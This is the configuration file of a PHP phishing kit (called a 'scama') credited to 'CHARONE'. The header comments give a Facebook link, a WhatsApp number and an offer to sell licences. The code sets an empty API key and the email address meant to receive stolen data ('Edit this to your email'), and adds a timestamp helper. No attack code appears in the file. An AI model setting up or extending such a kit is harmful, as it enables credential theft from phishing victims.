<?php
	/*
	# -> All Created By CHARONE .
	# -> ❓ Question Message Me  https://www.facebook.com/moussa.benchikha.3 .
	# -> 💬 WhatsApp  +447737164735
	# -> © Copyright 2019 To Charone Do not Change This Line Or scama Won`t work :) ! If You Like To Buy licence Please message me .
	*/
	// ================================= //
	// ================================= //
	// This is your Scama Key if you post the scama will banned Don`t edit it .
	$API_KEY = "";
	// ================================= //
	// ================================= //
	$yours = "moussabencheikha@gmail.com";		// Edit this to your email 
	// ================================= //
	// ================================= //

	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}

?>